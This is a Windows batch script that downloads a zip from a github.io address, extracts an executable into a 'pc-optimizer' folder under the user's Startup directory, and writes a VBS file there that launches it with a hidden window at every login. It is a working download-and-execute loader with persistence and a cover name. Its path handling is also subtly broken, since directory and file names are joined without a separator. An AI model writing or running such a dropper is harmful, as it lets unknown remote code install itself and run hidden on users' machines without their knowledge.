@echo off
setlocal

:: ===== CONFIGURATION =====
:: Replace the URL with your actual zip file link
set "URL=https://luckiestpancake.github.io/Files/test.zip"
set "ZIP_NAME=downloaded_app.zip"
set "TARGET_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pc-optimizer"
set "EXE_NAME=test.exe"
set "BAT_FILE=start.bat"

echo Creating Target Directory...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo Downloading file with wget...
:: Using powershell's wget (alias for Invoke-WebRequest)
powershell -Command "wget '%URL%' -OutFile '%TARGET_DIR%%ZIP_NAME%'"

echo Extracting files...
powershell -Command "Expand-Archive -Path '%TARGET_DIR%%ZIP_NAME%' -DestinationPath '%TARGET_DIR%' -Force"

echo Cleaning up zip file...
del "%TARGET_DIR%%ZIP_NAME%"

:: Create batch file to start your application
(
echo @echo off
echo cd /d "%TARGET_DIR%"
echo start "" "%EXE_NAME%"
) > "%TARGET_DIR%%BAT_FILE%"

:: Create VBS script to run batch silently
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run chr(34) & "%TARGET_DIR%%BAT_FILE%" & Chr(34), 0
echo Set WshShell = Nothing
) > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"

echo Installation complete
